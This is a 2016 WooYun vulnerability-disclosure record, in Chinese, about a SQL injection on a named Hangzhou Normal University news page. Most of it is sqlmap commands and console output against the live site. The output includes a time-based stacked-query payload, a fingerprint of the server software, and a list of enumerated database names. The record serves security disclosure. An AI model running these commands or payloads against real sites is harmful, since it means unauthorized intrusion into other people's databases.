{"id": 74628, "wybug_id": "wooyun-2016-0174691", "wybug_title": "杭州师范大学某站注入（用了waf也不要自信）", "wybug_corp": "杭州师范大学", "wybug_author": "xq17", "wybug_date": "2016-02-04 09:49", "wybug_open_date": "2016-02-22 09:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 23333--审核求过 详细说明：  自己写的小杀器毕竟不够屌--虽然爆了很多get可是不出数据有waf好像把http://yyxy.hznu.edu.cn/news.asp title_Search=88952634 报告主人该处存在POST sql注入漏洞--post去忽略了啊既然这样直接开sqlmap罗盲住。--可以出数据跑到卡机了就不跑了有表   漏洞证明：  \nE:\\PHPnow-1.5.6.4237493736\\htdocs\\proxy\\sqlmapproject-sqlmap-0.9-4439-gaee47d3\\qlmapproject-sqlmap-aee47d3>sqlmap.py -u \"http://yyxy.hznu.edu.cn/news.asp\" --dta \"title_Search=123\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512180a8c}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutua consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not resposible for any misuse or damage caused by this program[*] starting at 22:52:19[22:52:20] [INFO] testing connection to the target URL[22:52:20] [INFO] checking if the target is protected by some kind of WAF/IPS/IS[22:52:20] [INFO] testing if the target URL is stable[22:52:21] [INFO] target URL is stable[22:52:21] [INFO] testing if POST parameter 'title_Search' is dynamic[22:52:21] [WARNING] POST parameter 'title_Search' does not appear dynamic[22:52:21] [WARNING] heuristic (basic) test shows that POST parameter 'title_Serch' might not be injectable[22:52:21] [INFO] testing for SQL injection on POST parameter 'title_Search'[22:52:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[22:52:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace[22:52:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDERY or GROUP BY clause'[22:52:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[22:52:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHEREr HAVING clause'[22:52:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLype)'[22:52:32] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[22:52:33] [INFO] testing 'MySQL inline queries'[22:52:33] [INFO] testing 'PostgreSQL inline queries'[22:52:33] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[22:52:33] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'[22:52:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'[22:52:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment'[22:52:47] [INFO] POST parameter 'title_Search' seems to be 'Microsoft SQL Servr/Sybase stacked queries (comment)' injectableit looks like the back-end DBMS is '['Microsoft SQL Server', 'Sybase']'. Do youwant to skip test payloads specific for other DBMSes? [Y/n]for the remaining tests, do you want to include all tests for '['Microsoft SQLerver', 'Sybase']' extending provided level (1) and risk (1) values? [Y/n][22:52:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[22:52:50] [INFO] automatically extending ranges for UNION query injection techique tests as there is at least one other (potential) technique found[22:52:51] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extendinghe range for current UNION query injection technique test[22:52:52] [INFO] target URL appears to have 9 columns in queryinjection not exploitable with NULL values. Do you want to try with a random ineger value for option '--union-char'? [Y/n][22:53:22] [WARNING] if UNION based SQL injection is not detected, please consier forcing the back-end DBMS (e.g. '--dbms=mysql')[22:53:22] [INFO] checking if the injection point on POST parameter 'title_Searh' is a false positivePOST parameter 'title_Search' is vulnerable. Do you want to keep testing the oters (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 141 HTTP(s)equests:---Parameter: title_Search (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: title_Search=123';WAITFOR DELAY '0:0:5'-----[22:53:41] [INFO] testing Microsoft SQL Server[22:53:41] [WARNING] it is very important not to stress the network adapter durng usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][22:53:54] [INFO] confirming Microsoft SQL Server[22:54:00] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[22:54:00] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 12 times[22:54:00] [INFO] fetched data logged to text files under 'C:\\Documents and Setings\\Administrator\\.sqlmap\\output\\yyxy.hznu.edu.cn'[*] shutting down at 22:54:00E:\\PHPnow-1.5.6.4237493736\\htdocs\\proxy\\sqlmapproject-sqlmap-0.9-4439-gaee47d3\\qlmapproject-sqlmap-aee47d3>sqlmap.py -u \"http://yyxy.hznu.edu.cn/news.asp\" --dta \"title_Search=123\" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512180a8c}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutua consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not resposible for any misuse or damage caused by this program[*] starting at 22:54:24[22:54:25] [INFO] resuming back-end DBMS 'microsoft sql server'[22:54:25] [INFO] testing connection to the target URL[22:54:25] [INFO] checking if the target is protected by some kind of WAF/IPS/ISsqlmap resumed the following injection point(s) from stored session:---Parameter: title_Search (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: title_Search=123';WAITFOR DELAY '0:0:5'-----[22:54:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[22:54:25] [INFO] fetching database names[22:54:25] [INFO] fetching number of databases[22:54:25] [WARNING] time-based comparison requires larger statistical model, pease wait..............................[22:54:32] [WARNING] it is very important not to stress the network adapter durng usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n]1[22:54:51] [INFO] adjusting time delay to 1 second due to good response times6[22:54:53] [INFO] retrieved: Artsexam[22:55:45] [INFO] retrieved: hzmusic[22:56:29] [INFO] retrieved: master[22:57:08] [INFO] retrieved: model[22:57:41] [INFO] retrieved: msdb[22:58:06] [INFO] retrieved: museum[22:58:43] [INFO] retrieved: Northwind[22:59:44] [INFO] retrieved: p[23:00:01] [ERROR] invalid character detected. retrying..[23:00:01] [WARNING] increasing time delay to 2 secondsubs[23:00:31] [INFO] retrieved: sw\n   修复方案：  过滤吧--认真给分吧---你们安全做的不错又是350又是d盾的吓死宝宝了   版权声明：转载请注明来源 xq17@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-22 09:00 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}